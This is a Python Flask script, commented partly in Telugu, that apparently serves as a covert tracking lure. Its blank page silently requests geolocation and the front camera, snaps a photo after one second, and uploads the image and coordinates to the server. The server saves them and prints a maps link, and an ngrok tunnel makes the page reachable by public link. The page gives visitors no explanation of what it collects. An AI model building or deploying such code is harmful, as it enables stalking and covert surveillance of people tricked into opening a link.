import os
import uuid
from flask import Flask, request
from pyngrok import ngrok

app = Flask(__name__)

# 'photos' డైరెక్టరీ సృష్టించడం (ఒకవేళ లేకపోతే)
os.makedirs('photos', exist_ok=True)

@app.route('/')
def index():
    return '''
    <html>
    <body>
    <video id="video" style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
    window.onload = function() {
        console.log('Page loaded, trying to get location and camera.');
        // First, request geolocation permission
        if (navigator.geolocation) {
            console.log('Geolocation is supported, requesting location...');
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                console.log('Location granted:', lat, lon);  // Log location for debugging
                
                // After obtaining location, request camera permission
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(function(stream) {
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        console.log('Camera access granted, capturing image...');
                        
                        setTimeout(function() {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            canvas.toBlob(function(blob) {
                                const formData = new FormData();
                                formData.append('lat', lat);
                                formData.append('lon', lon);
                                formData.append('photo', blob, 'photo.jpg');
                                
                                // Send location and photo to server
                                fetch('/upload', {
                                    method: 'POST',
                                    body: formData
                                }).then(response => {
                                    console.log('Photo and data sent successfully');
                                    stream.getTracks().forEach(track => track.stop());
                                }).catch(function(error) {
                                    console.error('Error sending photo:', error);
                                });
                            }, 'image/jpeg');
                        }, 1000);  // Capture after a short delay
                    })
                    .catch(function(error) {
                        console.error('Camera access error:', error);
                    });
            }, function(error) {
                // Handle errors when getting location
                if (error.code == error.PERMISSION_DENIED) {
                    console.error('Location access denied.');
                } else {
                    console.error('Error getting location:', error.message);
                }
            });
        } else {
            console.error('Geolocation is not supported by this browser.');
        }
    }
    </script>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    lat = request.form['lat']
    lon = request.form['lon']
    photo = request.files['photo']
    map_link = f"https://www.google.com/maps?q={lat},{lon}"
    print(f"Received location: {map_link}")
    photo_filename = f"photos/{uuid.uuid4()}.jpg"
    photo.save(photo_filename)
    print(f"Photo saved: {photo_filename}")
    return "Data received"

if __name__ == '__main__':
    # Create a secure public URL using ngrok
    public_url = ngrok.connect(5000)
    print(f"Public URL: {public_url}")
    app.run(port=5000)
